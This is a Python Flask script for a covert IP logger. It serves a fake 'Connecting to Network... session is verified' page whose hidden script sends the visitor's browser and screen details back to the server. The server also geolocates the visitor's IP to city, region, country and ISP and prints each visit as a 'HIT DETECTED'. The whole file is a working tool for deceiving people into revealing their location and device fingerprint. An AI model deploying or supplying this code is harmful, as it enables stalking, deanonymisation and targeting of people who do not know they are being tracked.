from flask import Flask, request, render_template_string
import urllib.request
import json

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Connecting...</title>
    <script>
        window.onload = function() {
            const deviceInfo = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screenResolution: window.screen.width + "x" + window.screen.height,
                language: navigator.language
            };
            
            fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(deviceInfo)
            });
        };
    </script>
</head>
<body style="background: #111; color: #fff; text-align: center; font-family: sans-serif; margin-top: 50px;">
    <h1>Connecting to Network...</h1>
    <p>Please wait while your session is verified.</p>
</body>
</html>
"""

def get_location_from_ip(ip_address):
    # Skip lookup for local development IPs
    if ip_address in ["127.0.0.1", "localhost"] or ip_address.startswith("10.") or ip_address.startswith("192.168."):
        return "Local Network / Testing"
    
    try:
        # Using a free public IP geolocation API service
        url = f"http://ip-api.com/json/{ip_address}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            if data.get('status') == 'success':
                city = data.get('city', 'Unknown')
                region = data.get('regionName', 'Unknown')
                country = data.get('country', 'Unknown')
                isp = data.get('isp', 'Unknown')
                return f"{city}, {region}, {country} (ISP: {isp})"
    except Exception:
        pass
    return "Location lookup failed"

@app.route('/')
def home():
    if request.headers.get('X-Forwarded-For'):
        client_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        client_ip = request.remote_addr
        
    user_agent = request.headers.get('User-Agent')
    location = get_location_from_ip(client_ip)
    
    print(f"\n[!] HIT DETECTED!")
    print(f" -> IP Address: {client_ip}")
    print(f" -> Estimated Location: {location}")
    print(f" -> Raw Browser/OS Header: {user_agent}")
    
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log_device():
    data = request.json
    print(f" -> Screen Resolution: {data.get('screenResolution')}")
    print(f" -> Platform/OS: {data.get('platform')}")
    print(f" -> Browser Language: {data.get('language')}")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
